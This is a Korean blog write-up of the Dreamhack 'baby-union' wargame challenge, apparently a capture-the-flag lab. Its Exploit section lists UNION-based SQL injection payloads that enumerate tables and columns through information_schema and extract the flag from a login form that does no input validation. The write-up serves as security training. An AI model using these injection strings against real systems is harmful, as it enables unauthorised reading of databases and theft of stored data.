---
title: "[Dreamhack] baby-union"
tags:
    - SQL Injection
date: "2024-08-08"
thumbnail: "/assets/baby_union/문제.png"
---

# Intro
---
[Dreamhack][Dreamhack]의 WarGame 中 [baby-union][baby-union]문제에 대한 **Write-up**을 작성하고자 한다.

# Analysis
---
#### Site
uid, upw를 입력하는 폼으로 전송되는 데이터는 SQL Injection 공격 쿼리에 대한 입력값 검증이 존재하지 않는다.
![site](/assets/baby_union/01_analysis_1.png){: style="border: 1px solid;"}

#### Query
다음과 같은 `users` 테이블이 존재하고 이를 이용하여 flag가 저장된 임의의 테이블의 데이터를 획득하는 것이 목표이다.
```sql
USE `secret_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null,
  descr varchar(128) not null
);

CREATE TABLE fake_table_name (
  idx int auto_increment primary key,
  fake_col1 varchar(128) not null,
  fake_col2 varchar(128) not null,
  fake_col3 varchar(128) not null,
  fake_col4 varchar(128) not null
);

INSERT INTO fake_table_name (fake_col1, fake_col2, fake_col3, fake_col4) values ('flag is ', 'DH{sam','ple','flag}');
```

# Exploit
---
- `UNION SQL Injection` 및 `concat()` 함수 이용
<br>

```plainText
-- Table 명 추출 --
uid=admin&upw='union all select null,table_name,null,null from information_schema.tables#
uid=admin&upw=' union all select 1,2,3,table_name from information_schema.TABLES where table_schema=database()#
' and 1=2 union all select 1,schema_name,3,4 from information_schema.schemata#

-- Column 명 추출 --
uid=admin&upw='union all select null,column_name,null,null from information_schema.columns where table_name='onlyflag'#
uid=admin&upw=' and 1=2 union all select 1,column_name,3,4 from information_schema.columns where table_schema='secret_db'#

-- FLAG 추출 --
uid=admin&upw='union all select svalue,sflag,null,sclose from onlyflag#
uid=admin&upw='union all select concat(svalue,sflag,sclose),null,null,null from onlyflag#
```

사용자 입력값에 대한 어떠한 검증도 존재하지 않기 때문에 쉽게 풀 수 있었다. 다양한 SQL 쿼리문으로 Table 명부터 차례로 데이터까지 모두 추출할 수 있다.
![password](/assets/baby_union/02_exploit_1.png){: style="border: 1px solid;"}


[Dreamhack]:https://dreamhack.io/
[baby-union]:https://dreamhack.io/wargame/challenges/984